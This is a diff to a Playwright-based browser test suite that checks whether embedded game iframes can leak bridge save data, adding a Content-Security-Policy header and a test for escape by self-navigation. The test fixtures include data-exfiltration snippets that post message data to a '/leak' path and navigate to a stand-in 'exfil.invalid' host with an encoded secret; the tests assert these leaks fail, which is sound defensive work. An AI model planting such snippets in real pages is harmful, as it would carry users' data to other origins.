@@ -4,6 +4,7 @@ import { resolve } from 'node:path';
 import { build, transform } from 'esbuild';
 import { afterAll, beforeAll, describe, expect, it } from 'vitest';
 import type { Browser, Page } from 'playwright-core';
+import { SHELL_FRAME_SRC } from '../../../packages/contract/src/shell-frame-src.js';
 import { browserPrerequisite, launchSiteBrowser } from './browser.js';
 
 const prerequisite = browserPrerequisite();
@@ -115,6 +116,8 @@ describe.skipIf(!prerequisite.ok)('iframe document authorization in native Chrom
           addEventListener('message',event=>fetch('/leak?data='+encodeURIComponent(JSON.stringify(event.data))));`),
         );
       }
+      // The shell's own policy, as the API serves it.
+      response.setHeader('Content-Security-Policy', SHELL_FRAME_SRC);
       response.end(`<div id="mount"></div><script>${script.replaceAll('</script', '<\\/script')}</script>`);
     });
     await new Promise<void>((ready) => server.listen(0, '127.0.0.1', ready));
@@ -234,6 +237,35 @@ describe.skipIf(!prerequisite.ok)('iframe document authorization in native Chrom
       await page.waitForTimeout(100);
       expect(leaks).toEqual([]);
       expect(await state(page)).toMatchObject({ reads: 1, accepted: [] });
+    } finally {
+      await page.close();
+    }
+  });
+
+  it('keeps a game from carrying bridge data to another origin by navigating itself', async () => {
+    const page = await openFixture();
+    const leaks: string[] = [];
+    page.on('request', (request) => {
+      if (request.url().startsWith('https://exfil.invalid/')) leaks.push(request.url());
+    });
+    // Fulfils an escaped navigation so the leak is observable.
+    await page.route('https://exfil.invalid/**', (route) =>
+      route.fulfill({ contentType: 'text/html', body: 'leaked' }),
+    );
+    try {
+      await render(
+        page,
+        html(`addEventListener('message',event=>{
+          if(event.source!==parent || event.data?.t!=='save:state') return;
+          parent.postMessage({proof:'reply',data:event.data.data},'*');
+          location.href='https://exfil.invalid/?data='+encodeURIComponent(event.data.data);
+        });${hello}`),
+      );
+      await expect
+        .poll(async () => (await state(page)).accepted)
+        .toEqual([expect.objectContaining({ proof: 'reply', data: JSON.stringify({ secret: 'current-save' }) })]);
+      await page.waitForTimeout(300);
+      expect(leaks).toEqual([]);
     } finally {
       await page.close();
     }
